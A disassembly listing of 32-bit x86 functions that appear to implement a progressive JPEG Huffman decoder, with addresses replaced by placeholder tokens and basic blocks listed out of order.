add eax [ edx * 4 + r--data ]
mov [ ebp - 0x70 ] eax
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x10 ] ecx
xor al al
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x70 ]
mov [ ebp - 0x44 ] edx
mov eax [ ebp - 0x48 ]
mov ecx [ eax * 4 + r--data ]
mov edx [ ebp - 0x38 ]
mov ax [ ebp - 0x44 ]
mov [ edx + ecx * 2 ] ax
jmp r-xdata
sub_423d50
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x198 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x194 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
mov ecx [ ecx + 0x14 ]
add ecx eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x194 ]
mov [ eax + 0x14 ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] 0x0
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x194 ]
call [ ecx + 0x8 ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
xor al al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x124 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xfc ]
mov [ ecx + 0x24 ] eax
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x17c ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0x14 ] 0x0
jmp r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] 0x0
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
sub_423e20
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
push edi
push 0x40
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x198 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_423f10
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
cmp [ ebp - 0x10 ] 0x4
jge r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
shl ecx 0x6
shl ecx 0x2
push ecx
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx ]
add esp 0xc
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8c ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8c ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x2c ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + 0x24 ]
jge r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
cmp [ ebp - 0x10 ] 0x40
jge r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0xffffffff
mov ecx [ ebp - 0x8 ]
add ecx 0x4
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
sub_423f10
push ebp
mov ebp esp
sub esp 0x6c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x198 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x16c ] 0x0
sete al
mov [ ebp - 0x8 ] al
mov [ ebp - 0xc ] 0x0
mov ecx [ ebp - 0x8 ]
and ecx 0xff
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x16c ]
cmp edx [ ecx + 0x170 ]
jg r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x170 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x170 ] 0x40
jl r-xdata
jmp r-xdata
mov [ ebp - 0xc ] 0x1
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x174 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x1
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x124 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x178 ] 0xd
jle r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x174 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x178 ] ecx
je r-xdata
mov ecx [ ebp - 0xc ]
and ecx 0xff
test ecx ecx
je r-xdata
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x10
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16c ]
mov [ edx + 0x18 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x170 ]
mov [ eax + 0x1c ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x174 ]
mov [ ecx + 0x20 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x178 ]
mov [ edx + 0x24 ] ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx ]
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
cmp ecx [ eax + 0x124 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x174 ] 0x0
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0x128 ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x24 ]
shl eax 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8c ]
add edx eax
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x8 ]
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
and ecx 0xff
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x8 ]
and ecx 0xff
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16c ]
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
cmp [ ecx ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_424b60
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_424a00
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] sub_424680
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_4242c0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
cmp ecx [ eax + 0x170 ]
jg r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x73
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp - 0x24 ]
mov [ edx + 0x18 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x1c ] 0x0
push 0xffffffff
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx + 0x4 ]
add esp 0x8
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
cmp eax [ edx + 0x124 ]
jge r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
cmp [ eax + edx * 4 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x0
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xfc ]
mov [ ecx + 0x28 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0x128 ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x8 ]
and ecx 0xff
test ecx ecx
je r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x2c ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x20 ]
mov edx [ ecx + 0x18 ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + eax * 4 + 0x2c ]
push edx
mov eax [ ebp - 0x18 ]
push eax
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
call sub_422d80
add esp 0x10
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + eax * 4 + 0x2c ]
mov [ edx + 0x3c ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x174 ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x178 ]
mov [ ecx + eax * 4 ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x14 ] 0x73
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp - 0x24 ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp - 0x14 ]
mov [ ecx + 0x1c ] edx
push 0xffffffff
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx + 0x4 ]
add esp 0x8
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x28 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x174 ]
cmp eax [ ebp - 0x28 ]
je r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
lea ecx [ eax + edx * 4 + 0x2c ]
push ecx
mov edx [ ebp - 0x18 ]
push edx
push 0x1
mov eax [ ebp + 0x8 ]
push eax
call sub_422d80
add esp 0x10
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x18 ] 0x0
jmp r-xdata
sub_4242c0
push ebp
mov ebp esp
sub esp 0xa0
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x198 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x178 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0xfc ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0x8 ]
test edx edx
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x28 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x28 ]
sub eax 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x28 ] eax
mov al 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov eax [ edx ]
mov [ ebp - 0x38 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0xc ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
mov [ ebp - 0x24 ] ecx
mov esi [ ebp - 0x4 ]
add esi 0x14
mov ecx 0x5
lea edi [ ebp - 0x4c ]
[ edi ] [ esi ]
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4245b0
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
cmp ecx [ eax + 0x140 ]
jge r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp - 0x38 ]
mov [ edx ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp - 0x34 ]
mov [ edx + 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x20 ]
mov [ ecx + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x24 ]
mov [ eax + 0x10 ] ecx
mov edi [ ebp - 0x4 ]
add edi 0x14
mov ecx 0x5
lea esi [ ebp - 0x4c ]
[ edi ] [ esi ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0x144 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0x128 ]
mov [ ebp - 0x54 ] ecx
mov edx [ ebp - 0x54 ]
mov eax [ edx + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax * 4 + 0x2c ]
mov [ ebp - 0x50 ] edx
cmp [ ebp - 0x24 ] 0x8
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x24 ]
sub ecx 0x8
mov edx [ ebp - 0x20 ]
sar edx cl
and edx 0xff
mov [ ebp - 0x5c ] edx
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x50 ]
mov edx [ ecx + eax * 4 + 0x90 ]
mov [ ebp - 0x58 ] edx
cmp [ ebp - 0x58 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x20 ]
push ecx
lea edx [ ebp - 0x38 ]
push edx
call sub_423170
add esp 0x10
and eax 0xff
test eax eax
jne r-xdata
mov [ ebp - 0x58 ] 0x9
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x58 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x50 ]
add ecx [ ebp - 0x5c ]
xor edx edx
mov dl [ ecx + 0x490 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x24 ] ecx
cmp [ ebp - 0x24 ] 0x8
jge r-xdata
xor al al
jmp r-xdata
mov edx [ ebp - 0x30 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x24 ] eax
xor al al
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x58 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0xc ]
add ecx [ ebp + eax * 4 - 0x48 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
mov [ ebp + edx * 4 - 0x48 ] eax
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
shl edx cl
mov eax [ ebp - 0x1c ]
mov [ eax ] dx
jmp r-xdata
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp - 0xc ]
jge r-xdata
mov eax [ ebp - 0x58 ]
push eax
mov ecx [ ebp - 0x50 ]
push ecx
mov edx [ ebp - 0x24 ]
push edx
mov eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x38 ]
push ecx
call sub_423340
add esp 0x14
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x24 ]
sar eax cl
mov edx 0x1
mov ecx [ ebp - 0xc ]
shl edx cl
sub edx 0x1
and eax edx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
cmp ecx [ eax * 4 + r--data ]
jge r-xdata
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x20 ]
push ecx
lea edx [ ebp - 0x38 ]
push edx
call sub_423170
add esp 0x10
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x60 ] ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax [ edx * 4 + r--data ]
mov [ ebp - 0x60 ] eax
jmp r-xdata
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x24 ] ecx
xor al al
jmp r-xdata
mov edx [ ebp - 0x60 ]
mov [ ebp - 0xc ] edx
sub_4245b0
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x198 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x194 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
mov ecx [ ecx + 0x14 ]
add ecx eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x194 ]
mov [ eax + 0x14 ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] 0x0
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x194 ]
call [ ecx + 0x8 ]
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
xor al al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x124 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xfc ]
mov [ edx + 0x28 ] ecx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x17c ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0x18 ] 0x0
jmp r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] 0x0
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
sub_424680
push ebp
mov ebp esp
sub esp 0x8c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x198 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x170 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x178 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xfc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov cl [ eax + 0x8 ]
test ecx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x28 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x28 ]
sub eax 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x28 ] eax
mov al 0x1
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x14 ]
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
jbe r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4245b0
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov edx [ ecx ]
mov [ ebp - 0x3c ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
mov edx [ ecx + 0x4 ]
mov [ ebp - 0x38 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x40 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16c ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ecx [ ebp - 0x1c ]
sub ecx 0x1
mov [ ebp - 0x1c ] ecx
jmp r-xdata
xor al al
jmp r-xdata
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x8 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x1c ]
mov [ eax + 0x14 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov ecx [ ebp - 0x3c ]
mov [ eax ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov ecx [ ebp - 0x38 ]
mov [ eax + 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x24 ]
mov [ edx + 0xc ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x28 ]
mov [ ecx + 0x10 ] edx
cmp [ ebp - 0x28 ] 0x8
jge r-xdata
mov ecx [ ebp - 0x28 ]
sub ecx 0x8
mov edx [ ebp - 0x24 ]
sar edx cl
and edx 0xff
mov [ ebp - 0x48 ] edx
mov eax [ ebp - 0x48 ]
mov ecx [ ebp - 0x40 ]
mov edx [ ecx + eax * 4 + 0x90 ]
mov [ ebp - 0x44 ] edx
cmp [ ebp - 0x44 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x24 ]
push ecx
lea edx [ ebp - 0x3c ]
push edx
call sub_423170
add esp 0x10
and eax 0xff
test eax eax
jne r-xdata
mov [ ebp - 0x44 ] 0x9
mov eax [ ebp - 0x28 ]
sub eax [ ebp - 0x44 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x40 ]
add ecx [ ebp - 0x48 ]
xor edx edx
mov dl [ ecx + 0x490 ]
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x28 ] ecx
cmp [ ebp - 0x28 ] 0x8
jge r-xdata
xor al al
jmp r-xdata
mov edx [ ebp - 0x34 ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x28 ] eax
xor al al
jmp r-xdata
mov ecx [ ebp - 0x10 ]
sar ecx 0x4
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x10 ]
and edx 0xf
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ ebp - 0x44 ] 0x1
jmp r-xdata
cmp [ ebp - 0x18 ] 0xf
jne r-xdata
mov eax [ ebp - 0x14 ]
add eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x28 ]
cmp ecx [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x44 ]
push eax
mov ecx [ ebp - 0x40 ]
push ecx
mov edx [ ebp - 0x28 ]
push edx
mov eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp - 0x3c ]
push ecx
call sub_423340
add esp 0x14
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
mov eax 0x1
mov ecx [ ebp - 0x18 ]
shl eax cl
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov edx [ ebp - 0x14 ]
add edx 0xf
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov edx [ ebp - 0x28 ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x28 ]
sar eax cl
mov edx 0x1
mov ecx [ ebp - 0x10 ]
shl edx cl
sub edx 0x1
and eax edx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
cmp ecx [ eax * 4 + r--data ]
jge r-xdata
mov edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x24 ]
push ecx
lea edx [ ebp - 0x3c ]
push edx
call sub_423170
add esp 0x10
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x1c ]
sub ecx 0x1
mov [ ebp - 0x1c ] ecx
jmp r-xdata
mov ecx [ ebp - 0x28 ]
cmp ecx [ ebp - 0x18 ]
jge r-xdata
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x4c ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x18 ]
add eax [ edx * 4 + r--data ]
mov [ ebp - 0x4c ] eax
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x28 ] ecx
xor al al
jmp r-xdata
mov edx [ ebp - 0x28 ]
sub edx [ ebp - 0x18 ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x28 ]
sar eax cl
mov edx 0x1
mov ecx [ ebp - 0x18 ]
shl edx cl
sub edx 0x1
and eax edx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x18 ]
push edx
mov eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x24 ]
push ecx
lea edx [ ebp - 0x3c ]
push edx
call sub_423170
add esp 0x10
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x4c ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
shl eax cl
mov ecx [ ebp - 0x14 ]
mov edx [ ecx * 4 + r--data ]
mov ecx [ ebp - 0x20 ]
mov [ ecx + edx * 2 ] ax
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x28 ] ecx
xor al al
jmp r-xdata
sub_424a00
push ebp
mov ebp esp
sub esp 0x6c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x198 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax 0x1
mov ecx [ edx + 0x178 ]
shl eax cl
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0xfc ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov ecx [ eax ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov ecx [ eax + 0x4 ]
